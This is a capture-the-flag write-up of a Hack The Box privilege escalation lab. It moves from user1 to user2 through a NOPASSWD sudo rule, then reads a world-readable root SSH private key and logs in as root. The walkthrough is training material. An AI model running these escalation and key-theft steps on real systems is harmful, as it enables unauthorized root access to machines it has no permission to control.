
# HTB Getting Started: Privilege Escalation

In this challenge, we are provided with SSH credentials for `user1` and a non-default port. The goal is to:

1. Laterally move to `user2` and read the flag at `/home/user2/flag.txt`
2. Escalate privileges to `root` and retrieve the final flag at `/root/flag.txt`

---

## Step 1: Login via SSH

We start by logging into the server using the provided credentials and port:

```bash
ssh user1@<IP> -p <PORT>
```

Once logged in, running `ls` may fail due to permission restrictions in the home directory. Instead, we change to the root directory and navigate manually:

```bash
cd /
cd home/user2
```

Here, we find `flag.txt`, but it’s readable only by `user2`.

---

## Step 2: Lateral Movement to `user2`

We check for commands that `user1` can run as another user without a password:

```bash
sudo -l
```

We discover that `user1` can run `/bin/bash` as `user2`:

```bash
User user1 may run the following commands on hostname:
    (user2) NOPASSWD: /bin/bash
```

We switch to `user2` using:

```bash
sudo -u user2 /bin/bash
```

Now, we can access the flag:

```bash
cat /home/user2/flag.txt
```

Flag: `REDACTED`

---

## Step 3: Privilege Escalation to Root

Next, we try to access the `/root` directory:

```bash
cd /root
```

Surprisingly, the `.ssh` folder is accessible:

```bash
cd .ssh
ls -la
```

We find that one of the private keys is world-readable. We copy this key to our local machine and set proper permissions:

```bash
chmod 600 root_id_rsa
```

Then, we SSH into the machine as `root` using the key:

```bash
ssh -i root_id_rsa root@<IP> -p <PORT>
```

Once logged in as root:

```bash
cat /root/flag.txt
```

Flag: `REDACTED`

---

## Summary

- Used `sudo` permissions to move from `user1` to `user2`.
- Found a world-readable root private key and used it to SSH as root.
- I learnt the importance of limiting `sudo` access.
